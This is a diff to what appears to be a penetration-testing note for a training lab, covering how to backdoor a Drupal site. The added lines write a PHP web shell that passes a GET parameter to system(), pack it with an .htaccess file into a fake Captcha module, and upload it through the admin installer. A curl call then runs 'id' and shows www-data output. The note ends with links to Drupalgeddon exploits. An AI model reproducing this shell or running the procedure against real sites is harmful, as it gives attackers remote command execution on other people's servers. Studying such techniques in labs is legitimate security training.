@@ -50,6 +50,28 @@ or can be downloaded manually for >v8
 ```bash
 wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
 ```
-## Uploading a Backdoored Module
+## Uploading a Backdored Module
 ```bash
 wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
+
+echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]); ?>' > shell.php
+
+cat .htaccess
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+</IfModule>
+
+mv shell.php .htaccess captcha
+tar cvf captcha.tar.gz captcha/
+```
+Assuming we have administrative access to the website, click on Manage and then Extend on the sidebar. Next, click on the + Install new module button, and we will be taken to the install page, such as http://drupal.inlanefreight.local/admin/modules/install Browse to the backdored Captcha archive and click Install.
+```bash
+curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+## RCE
+https://www.exploit-db.com/exploits/34992
+https://www.exploit-db.com/exploits/44448
+https://github.com/rithchard/Drupalgeddon3
